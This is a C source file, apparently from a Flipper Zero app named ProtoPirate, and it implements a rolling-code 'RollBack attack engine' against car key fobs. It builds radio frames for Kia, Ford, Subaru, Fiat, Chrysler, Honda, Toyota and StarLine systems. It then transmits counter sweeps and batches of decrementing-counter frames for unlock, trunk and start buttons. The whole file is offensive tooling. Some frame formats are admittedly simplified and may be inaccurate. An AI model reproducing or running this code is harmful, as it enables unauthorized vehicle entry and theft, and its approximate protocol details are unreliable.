#include "protopirate_rb.h"

// ===================== 按钮值映射（每种协议 + 按钮索引 → 实际按钮值）=====================
// btn_idx 0=Lock, 1=Unlock, 2=Trunk, 3=Panic/Start
uint8_t rollback_get_button_value(uint8_t proto_type, uint8_t btn_idx) {
    switch(proto_type) {
    case Proto_Kia_V0:
    case Proto_Kia_V1:
    case Proto_Kia_V2:
        // Kia: 1=Lock, 2=Unlock, 3=Trunk, 4=Panic
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        if(btn_idx == 2) return 3;
        return 4;
    case Proto_Ford:
        // Ford: 1=Lock, 2=Unlock, 4=Boot
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        return 4;
    case Proto_Subaru:
        // Subaru: 1=Lock, 2=Unlock, 4=Trunk, 8=Panic
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        if(btn_idx == 2) return 4;
        return 8;
    case Proto_Fiat:
        // Fiat: 1=Unlock, 2=Lock, 4=Boot
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        return 4;
    case Proto_Chrysler:
    case Proto_Honda:
        // Chrysler/Honda: 1=Lock, 2=Unlock, 4=Trunk, 8=Panic
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        if(btn_idx == 2) return 4;
        return 8;
    case Proto_Toyota:
        // Toyota: 1=Lock, 2=Unlock, 4=Trunk
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        return 4;
    case Proto_Starline:
        // StarLine: 1=Arm, 2=Disarm, 4=Trunk, 8=Start
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        if(btn_idx == 2) return 4;
        return 8;
    default:
        return btn_idx + 1;
    }
}

// ===================== 多协议帧构建 =====================
// 根据协议类型构建不同的帧格式
void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t button,
                                uint32_t counter, uint32_t* data_hi, uint32_t* data_lo) {
    uint8_t frame[8] = {0};
    uint8_t crc;
    
    switch(proto_type) {
    case Proto_Kia_V0:
    case Proto_Kia_V1:
    case Proto_Kia_V2:
        // Kia HiTag2 帧格式:
        // [28-bit serial] | [4-bit button] | [16-bit counter] | [8-bit CRC] | [8-bit pad]
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | (button & 0x0F);
        frame[4] = (uint8_t)(counter >> 8) & 0xFF;
        frame[5] = (uint8_t)(counter) & 0xFF;
        crc = kia_crc8(frame, 6);
        frame[6] = crc;
        frame[7] = 0x00;
        break;
        
    case Proto_Ford:
        // Ford 40-bit 帧:
        // [20-bit serial] | [11-bit counter] | [4-bit button] | [5-bit fixed]
        frame[0] = (uint8_t)(serial >> 12) & 0xFF;
        frame[1] = (uint8_t)(serial >> 4) & 0xFF;
        frame[2] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 7) & 0x0F);
        frame[3] = (uint8_t)((counter & 0x7F) << 1) | (uint8_t)((button >> 3) & 0x01);
        frame[4] = (uint8_t)(button << 5) | 0x10;
        frame[5] = 0;
        frame[6] = 0;
        frame[7] = 0;
        break;
        
    case Proto_Subaru:
        // Subaru 56-bit Manchester:
        // [24-bit serial] | [16-bit counter] | [4-bit button] | [12-bit auth]
        frame[0] = (uint8_t)(serial >> 16) & 0xFF;
        frame[1] = (uint8_t)(serial >> 8) & 0xFF;
        frame[2] = (uint8_t)(serial) & 0xFF;
        frame[3] = (uint8_t)(counter >> 8) & 0xFF;
        frame[4] = (uint8_t)(counter) & 0xFF;
        frame[5] = (uint8_t)(button << 4) | 0x05;
        frame[6] = 0xAA; // auth seed
        frame[7] = 0x00;
        break;
        
    case Proto_Fiat:
        // Fiat 40-bit PWM:
        // [20-bit serial] | [8-bit counter] | [4-bit button] | [8-bit CRC/xor]
        frame[0] = (uint8_t)(serial >> 12) & 0xFF;
        frame[1] = (uint8_t)(serial >> 4) & 0xFF;
        frame[2] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 4) & 0x0F);
        frame[3] = (uint8_t)((counter & 0x0F) << 4) | (button & 0x0F);
        // Simple xor checksum over 4 bytes
        frame[4] = frame[0] ^ frame[1] ^ frame[2] ^ frame[3];
        frame[5] = 0;
        frame[6] = 0;
        frame[7] = 0;
        break;
        
    case Proto_Chrysler:
        // Chrysler 60-bit PWM:
        // [24-bit serial] | [8-bit counter] | [4-bit fixed] | [4-bit button] | [20-bit encrypted]
        frame[0] = (uint8_t)(serial >> 16) & 0xFF;
        frame[1] = (uint8_t)(serial >> 8) & 0xFF;
        frame[2] = (uint8_t)(serial) & 0xFF;
        frame[3] = (uint8_t)(counter) & 0xFF;
        frame[4] = (button << 4) | 0x08;
        // Encrypted part (simplified - xor with counter)
        frame[5] = (uint8_t)(counter ^ 0xA5) & 0xFF;
        frame[6] = (uint8_t)((counter >> 8) ^ 0x5A) & 0xFF;
        frame[7] = (uint8_t)(serial ^ counter) & 0xFF;
        break;
        
    case Proto_Honda:
        // Honda 40-bit:
        // [8-bit manuf] | [8-bit key] | [16-bit counter] | [8-bit button/checksum]
        frame[0] = 0x5A; // Honda manuf ID
        frame[1] = (uint8_t)(serial >> 16) & 0xFF;
        frame[2] = (uint8_t)(serial >> 8) & 0xFF;
        frame[3] = (uint8_t)(counter >> 8) & 0xFF;
        frame[4] = (uint8_t)(counter) & 0xFF;
        frame[5] = (uint8_t)(button << 4) | 0x0A;
        frame[6] = 0;
        frame[7] = 0;
        break;
        
    case Proto_Toyota:
        // Toyota 56-bit:
        // [28-bit serial] | [8-bit manuf] | [16-bit counter] | [4-bit button]
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | 0x05;
        frame[4] = (uint8_t)(counter >> 8) & 0xFF;
        frame[5] = (uint8_t)(counter) & 0xFF;
        frame[6] = (uint8_t)(button << 4) | 0x0F;
        frame[7] = 0;
        break;
        
    case Proto_Starline:
        // StarLine 64-bit encrypted:
        // [28-bit serial] | [8-bit command] | [28-bit encrypted auth]
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 12) & 0x0F);
        frame[4] = (uint8_t)(counter >> 4) & 0xFF;
        frame[5] = (uint8_t)((counter & 0x0F) << 4) | (button & 0x0F);
        frame[6] = (uint8_t)(counter ^ 0x3C) & 0xFF;
        frame[7] = (uint8_t)(button ^ 0x7E) & 0xFF;
        break;
        
    default:
        // 回退到 Kia V0
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | (button & 0x0F);
        frame[4] = (uint8_t)(counter >> 8) & 0xFF;
        frame[5] = (uint8_t)(counter) & 0xFF;
        crc = kia_crc8(frame, 6);
        frame[6] = crc;
        frame[7] = 0x00;
        break;
    }
    
    *data_hi = ((uint32_t)frame[0] << 24) | ((uint32_t)frame[1] << 16) |
               ((uint32_t)frame[2] << 8) | (uint32_t)frame[3];
    *data_lo = ((uint32_t)frame[4] << 24) | ((uint32_t)frame[5] << 16) |
               ((uint32_t)frame[6] << 8) | (uint32_t)frame[7];
}

// ===================== rollback_build_frame (旧版兼容) =====================
void rollback_build_frame(uint32_t serial, uint8_t button,
                          uint32_t counter, uint32_t* data_hi, uint32_t* data_lo) {
    // 默认使用 Kia V0 协议
    rollback_build_frame_proto(Proto_Kia_V0, serial, button, counter, data_hi, data_lo);
}

// ===================== RollBack 攻击引擎 =====================
bool rollback_send_single(ProtoPirateApp* app, uint32_t serial, uint8_t button, uint16_t counter) {
    uint32_t data_hi, data_lo;
    rollback_build_frame_proto(app->rollback.protocol_type, serial, button, counter, &data_hi, &data_lo);
    return transmit_packet(app, data_hi, data_lo, app->frequency, app->rollback.burst_count);
}

// ===================== 旧版兼容阻塞式 =====================
bool rollback_attack_run(ProtoPirateApp* app) {
    RollbackState* rs = &app->rollback;
    rs->running = true;
    rs->total_sent = 0;

    uint16_t start = rs->base_counter;
    uint16_t end = rs->target_counter;
    uint16_t step = rs->step_size;
    if(step == 0) step = 1;

    int16_t direction = (end > start) ? 1 : -1;
    uint32_t max_steps = 65536;

    FURI_LOG_I(TAG, "RollBack: proto=%s cnt 0x%04X->0x%04X step=%u burst=%u",
               rs->proto, start, end, step, rs->burst_count);

    if(!tx_init_hw(app, app->frequency)) {
        rs->running = false;
        return false;
    }

    uint32_t sent = 0;
    for(uint16_t cnt = start;; cnt += direction * step) {
        uint32_t data_hi, data_lo;
        rollback_build_frame_proto(rs->protocol_type, rs->serial, rs->button, cnt, &data_hi, &data_lo);
        
        transmit_packet(app, data_hi, data_lo, app->frequency, rs->burst_count);
        furi_delay_ms(20);
        
        rs->current_counter = cnt;
        sent++;
        rs->total_sent = sent;

        if((direction > 0 && cnt >= end) || (direction < 0 && cnt <= end)) break;
        if(sent > max_steps) break;
    }

    transmit_packet_stop(app);
    rs->running = false;
    FURI_LOG_I(TAG, "RollBack DONE: %lu frames sent", sent);
    return true;
}

// ===================== 批量递减发送 =====================
void batch_send_start(ProtoPirateApp* app) {
    if(!app || app->batch.count == 0) return;
    
    app->batch.active = true;
    app->batch.sent_so_far = 0;
    
    // 获取当前捕获的数据
    uint32_t dhi = app->last_result.data_hi;
    uint32_t dlo = app->last_result.data_lo;
    
    // 如果没有捕获数据，用 Rollback 参数
    if(dhi == 0 && dlo == 0) {
        rollback_build_frame_proto(
            app->rollback.protocol_type,
            app->rollback.serial,
            app->rollback.button,
            app->rollback.base_counter,
            &dhi, &dlo);
    }
    
    FURI_LOG_I(TAG, "Batch Send START: %u frames", app->batch.count);
    
    // 启动 TX
    if(!tx_init_hw(app, app->frequency)) {
        app->batch.active = false;
        return;
    }
    
    // 批量发送
    for(uint32_t i = 0; i < app->batch.count; i++) {
        if(!app->batch.active) break;
        
        transmit_packet(app, dhi, dlo, app->frequency, 2);
        furi_delay_ms(10); // 帧间延迟
        
        app->batch.sent_so_far = i + 1;
        
        // 第50/100/500 递减: 每次发送后递减 counter
        // 每发 N/50 次递减一次
        uint32_t decrement_every = app->batch.count / 50;
        if(decrement_every == 0) decrement_every = 1;
        
        if((i + 1) % decrement_every == 0) {
            // 构建下一帧（递减 counter）
            if(app->rollback.base_counter > 0) {
                app->rollback.base_counter--;
                rollback_build_frame_proto(
                    app->rollback.protocol_type,
                    app->rollback.serial,
                    app->rollback.button,
                    app->rollback.base_counter,
                    &dhi, &dlo);
            }
        }
    }
    
    transmit_packet_stop(app);
    app->batch.active = false;
    FURI_LOG_I(TAG, "Batch Send DONE: %lu frames sent", app->batch.sent_so_far);
}

void batch_send_stop(ProtoPirateApp* app) {
    if(!app) return;
    app->batch.active = false;
    transmit_packet_stop(app);
}
